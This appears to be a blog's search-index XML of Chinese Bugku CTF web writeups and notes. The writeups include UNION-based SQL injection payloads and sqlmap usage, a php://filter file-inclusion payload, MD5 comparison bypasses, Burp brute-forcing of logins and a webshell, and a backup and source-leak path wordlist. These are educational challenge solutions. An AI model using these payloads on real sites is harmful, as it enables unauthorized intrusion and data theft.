<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Bugku-速度要快]]></title>
    <url>%2F2019%2F02%2F03%2F201934%2F</url>
    <content type="text"><![CDATA[速度要快-writeup打开题目访问链接，查看审查元素，提示OK ,now you have to post the margin what you find 感觉需要post提交一些什么东西利用burp suite进行抓包看看，在response中headers发现了一串base64进行base64解密解出来感觉还是怪怪的感觉还是base64，进行解密 将解密出来的进行提交，提交失败，想到源代码中的备注post提交看一下提示我都说了让你快点。。。然后几次尝试发现每次headers中的base64在变化,发现PHPSESSID字段应该是要post提交保持同一个会话写python进行post提交123456789101112131415161718# coding: utf-8# 导入模块import requestsimport base64url = 'http://123.206.87.240:8002/web6/' # 链接convert = requests.session() # 创建会话对象（保持cookie）html = convert.get(url) # get请求head = html.headers['flag'] # 获取头部flag信息decode_1 = base64.b64decode(head) # 进行base64解密code = decode_1.decode('utf-8') # bytes转stringseparate = code.split(':') # 将base64解密后的字符串进行以‘：’进行分隔，获取flag后面的值decode_2 = base64.b64decode(separate[1]) # 返回分隔后的字符串列表，将解密后的进行二次base64解密flag = convert.post(url, data=&#123;'margin': decode_2&#125;) # 构造margin参数post提交print(flag.text)]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>CTF</tag>
        <tag>Python</tag>
        <tag>base64</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-秋名山老司机]]></title>
    <url>%2F2019%2F02%2F02%2F201933%2F</url>
    <content type="text"><![CDATA[秋名山老司机-writeup打开题目，秋名山老司机来飙车吗？访问链接，发现是一道计算题，算了下，2s?这道题明显要求计算响应内容中的表达式并POST请求正确的信息返回结果，还是快速反弹POST请求这里会纳闷传值传给谁，刷新了几下发现提示Give me value post about直接写python1234567891011121314# coding: utf-8# 导入模块import requestsimport reurl = 'http://123.206.87.240:8002/qiumingshan/' # 链接convert = requests.Session() # 创建session对象，session对象可以使我们跨请求保持某些参数，也可以在同一个session实例发出的所有请求之间保持cookieshtml = convert.get(url).text # get请求reg = re.compile(r'(?&lt;=&lt;div&gt;).*(?=\=)').findall(html) #匹配表达式如['2024653276+1430867578+1152697161*392577551-1429779315*779503901+1352271449+1584130862+557093247+1523782933+1160059856']payload = &#123;'value': eval(reg[0])&#125; # eval计算式子(匹配出来的是列表)并构造post请求的data部分flag = convert.post(url, data=payload) # post带参数提交flag.encoding = 'utf-8' #'utf-8'格式print(flag.text) 这个因为是2s的原因，要结合环境（程序自身的的运行时间、网速等因素）也有可能python的计算与服务端的计算有误差，导致出现了要一定的概率才会出现flag，（触及到我的知识盲区-_-!）多尝试几次。可以加个while True 循环，亦或者加个多线程并发。]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>CTF</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[正则表达式之零宽断言]]></title>
    <url>%2F2019%2F02%2F01%2F201932%2F</url>
    <content type="text"><![CDATA[正则表达式之零宽断言零宽断言:用于查找特定内容之前或之后的内容，但并不包括特定内容本身。断言用来声明一个应该为真的事实。正则表达式中只有当断言为真时才会继续进行匹配。简单来说就是匹配一个位置，这个位置满足某个正则，但不纳入结果的，所以叫“零宽断言”，而且这个位置的前面或后面需要满足某种正则。 分类 代码/语法 说明 零宽度正预测先行断言 (?=exp) 匹配exp前面的位置 零宽度正回顾后发断言 (?&lt;=exp) 匹配exp后面的位置 零宽度负预测先行断言 (?!exp) 匹配后面跟的不是exp的位置 零宽度负回顾后发断言 (?&lt;!exp) 匹配前面不是exp的位置 下面结合例子来理解下什么是零宽断言。零宽断言123正则表达式:(?&lt;=&lt;div&gt;).*(?=&lt;/div&gt;) 匹配字符串:&lt;div&gt;www.axiaowei.cn&lt;/div&gt; 匹配结果:www.axiaowei.cn 123正则表达式：(?&lt;=&lt;div&gt;).*匹配字符串:&lt;div&gt;www.axiaowei.cn&lt;/div&gt; 匹配结果:www.axiaowei.cn&lt;/div&gt; 123正则表达式：(?=www).*(?&lt;=cn)匹配字符串：&lt;div&gt;www.axiaowei.cn&lt;/div&gt; 匹配结果:www.axiaowei.cn 负向零宽断言123正则表达式：\d&#123;3&#125;(?!\d) -&gt;匹配三位数字的后面不能是数字匹配字符串：235456123匹配结果：123 123正则表达式：(?&lt;![a-z])\d&#123;7&#125; -&gt;匹配前面不是小写字母的七位数字匹配字符串：1111111d2222222d3333333S4444444匹配结果：1111111, 4444444 这里举一个常见的简单计算题，我们利用零宽断言进行匹配。三秒中算出式子（每次刷新式子也会变化），想必能算出来输入提交也超过三秒了吧，直接写python123456789101112131415161718# coding: utf-8import reimport requestsurl = 'http://123.206.31.85:10002/'convert = requests.session()html = convert.get(url).textreg = re.compile(r'.+(?=&lt;/p&gt;)').findall(html) # 零宽断言匹配link = ''for i in reg: link += idata = eval(link)post = convert.post(url, &#123;'result': data&#125;)print('三秒之内计算出以下式子：\n', link, '=', data)print(post.text) 参考资料：http://deerchao.net/tutorials/regex/regex.htm]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>re</tag>
        <tag>regex</tag>
        <tag>零宽断言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-成绩单]]></title>
    <url>%2F2019%2F02%2F01%2F201931%2F</url>
    <content type="text"><![CDATA[成绩单-writeup打开题目访问链接，根据上面提示分别输入1,2,3查询下尝试输入1’返回异常，输入1’#返回正常，判断存在注入尝试手动注入利用order by 判断列数为4列11'order by 4 # 返回正常 11'order by 5 # 返回异常 12利用联合查询查看显位payload:-1'union select 1,2,3,4 # 12爆库名paylaod:-1'union select 1,database(),3,4 # 12爆表名payload:-1'union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()# 12爆字段payload:-1'union select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema=database() and table_name='fl4g'# 123查询数据payload:-1'union select 1,group_concat(skctf_flag),3,4 from fl4g#![](https://i.imgur.com/QLw5GOG.png) 还可以使用sqlmap进行burp suite抓包，右键保存文件将文本放在sqlmap的当前目录下，打开sqlmap爆库爆表名爆字段爆字段信息123456789101112Sqlmap命令参数-r 是读文件 后面是刚才保存的绝对路径-p 是参数，也就是注入点（选了id是注入点）-D 是表示选择了后面的这个数据库 -T 指定表-C 指定要爆的字段--dbs –&gt;获取数据库名称--current-db –&gt;获取当前数据库名称--tables –&gt;获取表--columns –&gt;获取字段--dump –&gt;将结果导出 1234567891011121314151617181920212223242526272829303132333435Mysql数据库information_schema系统表说明:SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。STATISTICS表：提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。USER_PRIVILEGES（用户权限）表：给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。SCHEMA_PRIVILEGES（方案权限）表：给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。TABLE_PRIVILEGES（表权限）表：给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。COLUMN_PRIVILEGES（列权限）表：给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。CHARACTER_SETS（字符集）表：提供了mysql实例可用字符集的信息。是SHOW CHARACTER SET结果集取之此表。COLLATIONS表：提供了关于各字符集的对照信息。COLLATION_CHARACTER_SET_APPLICABILITY表：指明了可用于校对的字符集。这些列等效于SHOW COLLATION的前两个显示字段。TABLE_CONSTRAINTS表：描述了存在约束的表。以及表的约束类型。KEY_COLUMN_USAGE表：描述了具有约束的键列。ROUTINES表：提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。名为“mysql.proc name”的列指明了对应于INFORMATION_SCHEMA.ROUTINES表的mysql.proc表列。VIEWS表：给出了关于数据库中的视图的信息。需要有show views权限，否则无法查看视图信息。TRIGGERS表：提供了关于触发程序的信息。必须有super权限才能查看该表详情可以点击:https://wenku.baidu.com/view/6358a5fd89eb172ded63b7a8.html]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>CTF</tag>
        <tag>SQL注入</tag>
        <tag>Mysql</tag>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP语法]]></title>
    <url>%2F2019%2F01%2F31%2F201930%2F</url>
    <content type="text"><![CDATA[php语法strstr() 函数搜索字符串在另一字符串中的第一次出现。语法strstr(string,search,before_search) 参数 描述 string 必需。规定被搜索的字符串。 search 必需。规定所搜索的字符串。如果此参数是数字，则搜索匹配此数字对应的 ASCII 值的字符。 before_search 可选。默认值为 “false” 的布尔值。如果设置为 “true”，它将返回 search 参数第一次出现之前的字符串部分。 实例:123&lt;?phpecho strstr("axiaowei.cn?key1=1",'?');?&gt; substr() 函数返回字符串的一部分。语法substr(string,start,length) 参数 描述 string 必需。规定要返回其中一部分的字符串。 start 必需。规定在字符串的何处开始。正数-在字符串的指定位置开始负数-在从字符串结尾开始的指定位置开始。0-在字符串中的第一个字符处开始 length 可选。规定被返回字符串的长度。默认是直到字符串的结尾。正数-从 start 参数所在的位置返回的长度负数 - 从字符串末端返回的长度 实例123&lt;?phpecho substr("www.axiaowei.cn",4);?&gt; str_replace() 函数以其他字符替换字符串中的一些字符（区分大小写）。语法str_replace(find,replace,string,count) 参数 描述 find 必需。规定要查找的值 replace 必需。规定替换find中的值的值 string 必需。规定被搜索的字符串 count 可选。对替换数进行计数的变量 实例123&lt;?phpecho str_replace("world","xiaowei blog","Hello world!");?&gt; parse_str() 函数把查询字符串解析到变量中。语法parse_str(string,array) 参数 描述 string 必需。规定解析的字符串 array 可选。规定存储变量的数组名称。该参数指示变量将被存储到数组中 实例123456&lt;?phpparse_str("key1=xiaowei&amp;key2=2019");echo $key1;echo "\n";echo $key2;?&gt; $_SERVER[“REQUEST_URI”]函数1234567$_SERVER["REQUEST_URI"]函数预定义服务器变量的一种，所有$_SERVER开头的都叫做预定义服务器变量 REQUEST_URI的作用是取得当前URI，也就是除域名外后面的完整的地址路径例如：当前页面是http://www.axiaowei.cn/plus/search.php?kwtype=0&amp;keyword=php&amp;searchtype=titlekeywordecho $_SERVER["REQUEST_URI"];结果就为：plus/search.php?kwtype=0&amp;keyword=php&amp;searchtype=titlekeyword]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-备份是个好习惯]]></title>
    <url>%2F2019%2F01%2F31%2F201929%2F</url>
    <content type="text"><![CDATA[备份是个好习惯-writeup打开题目访问链接，给出一串md5值，尝试去md5解密一下，空密码根据题目提示，直接上御剑扫描(或者可以尝试常见的几个源码泄露)附常见的源码泄露、备份文件List123456789101112131415161718192021222324252627282930313233343536373839404142434445.git.git/HEAD.git/index.git/config.git/descriptionREADME.MDREADME.mdREADME.gitignore.svn.svn/wc.db.svn/entries.hg.ds_storeWEB-INF/web.xmlWEB-INF/src/WEB-INF/classesWEB-INF/libWEB-INF/database.propertieCVS/RootCVS/Entries.bzr/??~.?.swp.?.swo.?.swn.?.swm.?.swl_viminfo.viminfo?~?~1~?~2~?~3~?.save?.save1?.save2?.save3?.bak_Edietplus?.bak?.backphpinfo.phptest.php.bash_history File123456789101112131415161718index.phplogin.phpregister.phptest.phpphpinfo.phpt.phpwww.zipwww.rarwww.zipwww.7zwww.tar.gzwww.tarweb.zipweb.rarweb.zipweb.7zweb.tar.gzweb.tar 下载得到一个源码1234567891011121314151617181920&lt;?php/** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22*/include_once "flag.php"; //脚本执行期间包含并运行指定文件(只包含一次)ini_set("display_errors", 0); //不显示错误报告$str = strstr($_SERVER['REQUEST_URI'], '?'); //搜索当前url值中？(包含？)后边的字符串赋值给变量str$str = substr($str,1); //str中的第二个字符开始(含)，返回后面的字符串赋值给变量str$str = str_replace('key','',$str); //在str中查找key，并将其替换为空parse_str($str); //将str解析到变量中echo md5($key1); //将md5($key1)写入输出echo md5($key2); //将md5($key2)写入输出if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123; echo $flag."取得flag";&#125; //判断MD5加密后的key1值等于MD5加密后的key2值且key1的值不等于key2的值，成立输出flag?&gt; 可参考PHP语法现在我们对代码审计完后方法一构造payload：http://123.206.87.240:8002/web16/?kkeyey1[]=123&amp;kkeyey2[]=4561234md5()中需要传入的是一个string类型的参数，当我们传递一个数组时，它是不会报错的，函数无法求出数组的MD5值，这样导致任意两个数组的MD5值都相等，从而绕过输入数值的判断。md5算法比较数组会返回NULL，也就是等值。这里注意的是:$str = str_replace('key','',$str); 将key替换为空所以这里需要利用到重写(kkeyey)绕过 方法二构造payload：http://123.206.87.240:8002/web16/?kkeyey1=QNKCDZO&amp;kkeyey2=s878926199a12345678910==是比较运算，它不会去检查条件式的表达式的类型===是恒等，它会检查查表达式的值与类型是否相等。PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0（遇到0e\d+这种字符串，就会将这种字符串解析为科学计数法），所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。攻击者可以利用这一漏洞，通过输入一个经过哈希后以”0E”开头的字符串，即会被PHP解释为0，如果数据库中存在这种哈希值以”0E”开头的密码的话，他就可以以这个用户的身份登录进去，尽管并没有真正的密码。]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>CTF</tag>
        <tag>MD5</tag>
        <tag>bak</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-点击一百万次]]></title>
    <url>%2F2019%2F01%2F30%2F201928%2F</url>
    <content type="text"><![CDATA[点击一百万次-writeup打开题目访问链接，看来是要你点击一百万次，点了几下，好了我放弃了查看审查元素发现一串JavaScript12345678910111213141516var clicks=0 //声明一个clicks定位为0$(function() &#123; //$(document).ready(function() &#123; ... &#125;);的缩写，防止文档在完全加载（就绪）之前运行 jQuery 代码。如果在文档没有完全加载之前就运行函数，操作可能失败。其作用和 $(document).ready()一樣 ，用意在DOM載入後執行ready()方法。 $("#cookie").mousedown(function() &#123; //鼠标按下事件 $(this).width('350px').height('350px'); //$(this)代码代表$('#cookie)，鼠标按下之后id为cookie的元素改变宽度和高度 &#125;).mouseup(function() &#123; //鼠标松开事件 $(this).width('375px').height('375px'); //鼠标松开之后id为cookie的元素改变宽度和高度 clicks++; //clicks增加 $("#clickcount").text(clicks); //clicks++完给id为clickcount元素改变值 if(clicks &gt;= 1000000)&#123; //当clicks大于或等于1000000，声明一个form，并在body追加form var form = $('&lt;form action="" method="post"&gt;' + '&lt;input type="text" name="clicks" value="' + clicks + '" hidden/&gt;' +'&lt;/form&gt;'); //定义html代码 $('body').append(form); //在body插入html代码 form.submit(); //执行form表单提交 &#125; &#125;);&#125;); 打开浏览器Console提交clicks=999999，再点击一次页面也可以利用hackbar直接post提交clicks=1000000还有很多种方式，大家可以一一尝试下，只要将clicks值达到满足判断条件即可。]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>CTF</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-输入密码查看flag]]></title>
    <url>%2F2019%2F01%2F29%2F201927%2F</url>
    <content type="text"><![CDATA[输入密码查看flag-writeup打开题目访问链接，尝试输入12345，提示密码错误，利用burp suite爆破（题目已经给出提示）设置代理，在浏览器中随便输入五位数字，打开burp suite抓包，发送到Intruder在Intruder中Positions中选择Clear清除，将12345选中选择Add添加在Payloads设置好相应参数，数字类型、10000-99999，步长为1在Options选项中设置线程（看电脑性能）点击Start attack开始，过一会就出来了（正确密码与错误密码Length长度是有区别的）将密码输入浏览器中，点击查看，得到flag]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>CTF</tag>
        <tag>爆破</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-flag在index里]]></title>
    <url>%2F2019%2F01%2F29%2F201926%2F</url>
    <content type="text"><![CDATA[flag在index里-writeup打开题目访问链接，页面显示click me? no 点击进去显示test5这里我们看到url中含有file关键字题目提示我们flag在index中，通过分析，这里发送了file为key，show.php为value的get请求ctf常见的套路-php文件包含漏洞12345&lt;?php $file=$_GET['file']; ... include($file); ?&gt; 12php://-访问各个输入/输出流（I/O streams）PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。 12php://filterphp://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。 名称 描述 resource=&lt;要过滤的数据流&gt; 指定你要筛选过滤的数据流 read=&lt;读链的筛选列表&gt; 可以设定一个或多个过滤器名称，以管道符(&#124;)分隔 write=&lt;写链的筛选列表&gt; 可以设定一个或多个过滤器名称，以管道符(&#124;)分隔 &lt;; 两个链的筛选列表&gt; 任何没有以read=或write作前缀的筛选列表会视情况应用于读或写链 利用这个协议我们可以解决一些ctf的题目，或者挖掘出一些漏洞。构造payload：http://123.206.87.240:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php12345678910111213141516171819202122php支持得伪协议file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流read参数值可为string.strip_tags 将数据流中的所有html标签清除string.toupper 将数据流中的内容转换为大写string.tolower 将数据流中的内容转换为小写convert.base64-encode 将数据流中的内容转换为base64编码convert.base64-decode 与上面对应解码resource=[文件路径] 返回一串base64编码1PGh0bWw+DQogICAgPHRpdGxlPkJ1Z2t1LWN0ZjwvdGl0bGU+DQogICAgDQo8P3BocA0KCWVycm9yX3JlcG9ydGluZygwKTsNCglpZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5kZXgucGhwP2ZpbGU9c2hvdy5waHAiPmNsaWNrIG1lPyBubzwvYT4nO30NCgkkZmlsZT0kX0dFVFsnZmlsZSddOw0KCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpew0KCQllY2hvICJPaCBubyEiOw0KCQlleGl0KCk7DQoJfQ0KCWluY2x1ZGUoJGZpbGUpOyANCi8vZmxhZzpmbGFne2VkdWxjbmlfZWxpZl9sYWNvbF9zaV9zaWh0fQ0KPz4NCjwvaHRtbD4NCg== base64解码后123456789101112131415&lt;html&gt; &lt;title&gt;Bugku-ctf&lt;/title&gt; &lt;?php error_reporting(0); if(!$_GET[file])&#123;echo '&lt;a href="./index.php?file=show.php"&gt;click me? no&lt;/a&gt;';&#125; $file=$_GET['file']; if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data"))&#123; echo "Oh no!"; exit(); //达到过滤效果，这是php://中的其他方法 &#125; include($file); //flag:flag&#123;edulcni_elif_lacol_si_siht&#125; #flag在注释中?&gt;&lt;/html&gt; 123include()函数，这个表示从外部引入php文件并执行，如果执行不成功，就返回文件的源码而include的内容是由用户控制的，所以通过我们传递的file参数，是include（）函数引入了index.php的base64编码格式，ase64编码格式导致执行不成功，返回base64格式源码。如果不进行base64编码传入，就会直接执行，而flag的信息在注释中，是得不到的。]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>CTF</tag>
        <tag>文件包含</tag>
        <tag>php://</tag>
        <tag>base64</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-WEB4]]></title>
    <url>%2F2019%2F01%2F28%2F201925%2F</url>
    <content type="text"><![CDATA[WEB4-writeup打开题目访问链接，提示看看源代码？查看源代码得到一串经过escape编码的代码进行escape解码后123var p1 = 'function checkSubmit()&#123;var a=document.getElementById("password");if("undefined"!=typeof a)&#123;if("67d709b2b';var p2 = 'aa648cf6e87a7114f1"==a.value)return!0;alert("Error");a.focus();return!1&#125;&#125;document.getElementById("levelQuest").onsubmit=checkSubmit;';eval(unescape(p1) + unescape('54aa2' + p2)); 主要看这一句eval(unescape(p1) + unescape(‘54aa2’ + p2))1234eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。语法eval（string）string-必需。要计算的字符串，其中含有要计算的JavaScript表达式或要执行的语句 p1+p2连接整理后的代码1234567891011function checkSubmit()&#123; var a=document.getElementById("password"); //匹配ID名为password的元素，并赋值给a if("undefined"!=typeof a)&#123; //判断a的类型是否undefined if("67d709b2b54aa2aa648cf6e87a7114f1"==a.value) //判断a的元素的value值是否为67d709b2b54aa2aa648cf6e87a7114f1（67d709b2b+54aa2+aa648cf6e87a7114f1） return!0; alert("Error"); //弹框“Error”” a.focus(); //获取焦点时，向元素添加特殊的样式（改变背景颜色） return!1 //! 表示取反运算，js 为弱类型语言，所有非0的int值都为 Bool 值的 True ，所以 !1就是取 True的反，即False。 &#125;&#125;document.getElementById("levelQuest").onsubmit=checkSubmit; //获取id为levelQuest文档元素，点击submit时执行checkSubmit函数，onsubmit再点击submit时发生，若返回真提交表单 12345678910111213141516171819var 声明（创建）JavaScript变量escape() 函数定义和用法escape() 函数可对字符串进行编码，这样就可以在所有的计算机上读取该字符串。语法escape(string)string-必需。需要转义或编码的字符串unescape() 函数定义和用法unescape() 函数可对通过 escape() 编码的字符串进行解码。unescape(string)string-必需。要解码或反转义的字符串typeof操作符返回一个字符串，表示未经计算的操作数的类型详情点击：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/typeof#%E5%8F%82%E6%95%B0 分析完代码后，表单的id值为levelQuest，通过审查元素将输入框的id值更改为password，输入框输入67d709b2b54aa2aa648cf6e87a7114f1点击submit]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>CTF</tag>
        <tag>escape</tag>
        <tag>unescape</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-网站被黑]]></title>
    <url>%2F2019%2F01%2F28%2F201924%2F</url>
    <content type="text"><![CDATA[网站被黑-writeup打开题目访问链接，大大黑页（好酷炫这东西可以玩一整天，2333）查看源代码，尝试了一些方法，没有找到一点思路打开御剑扫描工具，扫描一下看有没有敏感信息、源码泄露之类的得到一个链接，感觉像是一个后门地址正是一个shell后门，尝试几个常见的密码，无果直接用burp suite进行密码爆破进行抓包右键发送到intruder添加需要的变量，list选择自带的一个Passwords，点击Start attack开始这里length不一样的就是密码了因为我们通常输入正确的密码和错误的密码返回的请求长度是有区别的输入密码，得到flag]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>CTF</tag>
        <tag>shell后门</tag>
        <tag>弱口令爆破</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-头等舱]]></title>
    <url>%2F2019%2F01%2F28%2F201923%2F</url>
    <content type="text"><![CDATA[头等舱-writeup打开题目点击访问链接，查看源代码发现什么都没有利用burp suite抓包看下，根据题目提示头等舱，查看Response中的Headers信息，得到flag]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>CTF</tag>
        <tag>Headers</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-web5]]></title>
    <url>%2F2019%2F01%2F26%2F201922%2F</url>
    <content type="text"><![CDATA[web5-writeup打开题目点击访问,出现输入框，随便输入点字符串，点击提交，提示(在好好看看)查看源代码，出现了一大串(!+()[])，根据题目提示，这应该是一串JSFuck编码1234567891011JSFuck []()!+JSFuck是一种基于JavaScript原子部分的深奥教育编程风格。它只使用六个不同的字符来编写和执行代码。它不依赖于浏览器，因此您甚至可以在Node.js上运行它。简单来说JSFuck可以让你只用6个字符[]()!+来编写JavaScript程序。用途：①脚本注入时防止过滤②一定程度加密关键代码（不适合加密大量代码，毕竟太长了）③把包含的字符做到极致（[]()!+）④转换后本质依然是JavaScript，通过JavaScript的一些特性生成。了解更多可以访问：https://github.com/aemkei/jsfuck 我们直接将JSFuck复制下来利用浏览器的Console执行，或者在线工具进行转换（http://www.jsfuck.com/）将得到的值进行提交，提示（唉吆，已经非常非常接近了。。。）将得到的值换成大写（题目提示），提交]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>CTF</tag>
        <tag>JSFuck</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MORSE与ASCII码对应表]]></title>
    <url>%2F2019%2F01%2F26%2F201921%2F</url>
    <content type="text"><![CDATA[MORSE与ASCII码对应表 转换工具因为之前做到过相关的题目所以根据对应关系我写了一个ascii2morse_tool下载地址:https://github.com/alixiaowei/ascii2morse-tool12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788# coding: utf-8import sysif len(sys.argv) != 3: print(''' $$$$ @$$$&amp; $$$$q h$$$$$a $$$$$$) $$$$$ *$$$$$$&gt;]$ .$$$$$@ $$$$ $$[$ $$" X$$ @$d $$) $$ $$$ :$^ .$$$ $$! M$$ $$$ $$$ @$$ $$I ,$8 a$) $ $$$ $. $$ $$ "$$ $$$ o$$ p$$ +$M @$~ a$)$' f$ $ $$ $$f $$$ o$$ p$$ $$ $$ a$$ ;$$ &#125;$$ &lt;$$ $$$ o$$ p$$ 1$$ $$&lt; a$p $$$$; $$$ `$$ $$$ o$$ p$$ 8$$ $$$ a$) @$$$$$" $$$$$$$$$$$$$$$ $$$ o$$ p$$ B$$ $$$ a$) $$$$$\ $$$ $$$ o$$ p$$ Q$$ $$( a$) +$$$ $$$ $$$ o$$ p$$ $$ $$ a$) Q $$@ k$$ $$$ o$$ p$$ #$&lt; )$M a$) $ $$ $$ h $$$ o$$ p$$ $$ $$ a$) $$ .$+ +$$ $ $$$ $$$ %$$ $$&#125; l$@ 8$q $$$` :$C $$Q p$ $$$$$ $$$$$ $$$$$ $$$$$$$ $$$$$$$$$$$l $8'Z$$$$$$&amp; Q$$$$$$p @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ ''') print('-v Enter the ASCII you want to convert \n\nusage: python -v ascii2morse-tool.py "1001 00 01 111 011 0 00"\n') exit(1)if sys.argv[1] != '-v': print('usage: python -v ascii2morse-tool.py "1001 00 01 111 011 0 00"', ' \n 参数错误，请重新输入...') exit(1)string = sys.argv[2]key = string.split(' ')dictionary = &#123;'01': 'A', '1000': 'B', '1010': 'C', '100': 'D', '0': 'E', '0010': 'F', '110': 'G', '0000': 'H', '00': 'I', '0111': 'J', '101': 'K', '0100': 'L', '11': 'M', '10': 'N', '111': 'O', '0110': 'P', '1101': 'Q', '010': 'R', '000': 'S', '1': 'T', '001': 'U', '0001': 'V', '011': 'W', '1001': 'X', '1011': 'Y', '1100': 'Z', '01111': '1', '00111': '2', '00011': '3', '00001': '4', '00000': '5', '10000': '6', '11000': '7', '11100': '8', '11110': '9', '11111': '0', '001100': '?', '10010': '/', '101101': '()', '100001': '-', '010101': '.', '110011': ',', '011010': '@', '111000': ':', '101010': ':', '10001': '=', '011110': "'", '101011': '!', '001101': '_', '010010': '"', '10110': '(', '1111011': '&#123;', '1111101': '&#125;'&#125;value = ''for item in key: if item == '': continue value += dictionary[item]print('\nCapital: \n', value)print('\nLower case: \n', value.lower(), '\n\nwww.axiaowei.cn')]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>ASCII</tag>
        <tag>加密</tag>
        <tag>Morse</tag>
        <tag>Tool</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-easy_crypto]]></title>
    <url>%2F2019%2F01%2F26%2F201920%2F</url>
    <content type="text"><![CDATA[easy_crypto-writeup打开题目一个看似跟二进制相似的一串密文观察这一串密文，每一组都是由0和1组成，有长有短，刚开始还以为是ascii转换折腾了挺久，想了下会不会是Morse莫尔斯电码。找了下资料，找到了他们的对应关系。可参考Morse与ASCII码的对应关系找到这个剩下的就是将其对应的转换成相应的字符了可以使用我写的一个ascii2morse工具下载地址：https://github.com/alixiaowei/ascii2morse-tool]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
        <tag>CTF</tag>
        <tag>Python</tag>
        <tag>ASCII</tag>
        <tag>加密</tag>
        <tag>Morse</tag>
        <tag>Tool</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-变量1]]></title>
